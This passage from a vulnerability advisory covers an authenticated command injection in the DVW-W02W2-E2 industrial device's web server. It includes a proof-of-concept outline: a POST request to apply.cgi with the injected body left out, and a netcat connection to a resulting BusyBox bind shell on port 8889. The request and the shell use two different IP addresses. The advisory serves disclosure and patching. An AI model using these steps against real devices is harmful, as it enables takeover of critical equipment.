Vulnerable versions
-------------------------------------------------------------------------------
DVW-W02W2-E2 / V2.42

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection
The web server of the device is prone to an authenticated command injection.
It allows an attacker to gain full access to the underlying operating
system of
the device with all implications. If such a device is acting as key
device in
an industrial network, or controls various critical equipment via serial
ports,
more extensive damage in the corresponding network can be done by an
attacker.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection
The web server is prone to an authenticated command injection via POST
parameters. This is only possible if the "timestamp" parameter is set
correctly
in the URL. The following proof-of-concept shows how to open a port binding
shell on port 8889 with a "utelnetd" listener:
===============================================================================
POST /apply.cgi?/MT_ping.htm%20timestamp=$correct-timestamp$ HTTP/1.1
Host: 192.168.3.148
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3

===============================================================================

For accessing the device, the command "netcat" can be used:
===============================================================================
$ nc 192.168.3.150 8889
����!����

BusyBox v1.4.2 (2016-08-18 22:45:41 EDT) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

===============================================================================

The vulnerability was manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Update to firmware version V2.5.2.

Workaround
-------------------------------------------------------------------------------
None
